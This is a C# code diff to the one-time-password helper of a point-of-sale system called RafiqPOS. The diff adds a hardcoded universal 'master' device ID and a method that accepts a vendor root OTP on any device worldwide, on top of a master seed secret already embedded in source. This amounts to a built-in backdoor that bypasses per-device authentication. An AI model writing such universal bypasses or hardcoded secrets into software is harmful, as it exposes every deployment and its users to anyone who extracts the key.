@@ -12,6 +12,7 @@ namespace RafiqPOS.Common
     public static class RootOtpHelper
     {
         public const string MASTER_OTP_SEED = "RafiqPOS_Super_Vendor_Secret_Master_Key_2026_IslamKhaled";
+        public const string UNIVERSAL_MASTER_HWID = "RAFIQ_UNIVERSAL_MASTER_ROOT_KEY_2026";
 
         /// <summary>
         /// Generates a 6-digit numeric OTP for a specific device fingerprint (HWID) and hour window.
@@ -62,6 +63,14 @@ namespace RafiqPOS.Common
             }
 
             return false;
+        }
+        /// <summary>
+        /// Verifies whether the entered PIN matches the universal master developer root OTP
+        /// for any device across the world (used by vendor for universal emergency access).
+        /// </summary>
+        public static bool VerifyMasterUniversalOtp(string enteredPin)
+        {
+            return VerifyOtp(UNIVERSAL_MASTER_HWID, enteredPin);
         }
     }
 }
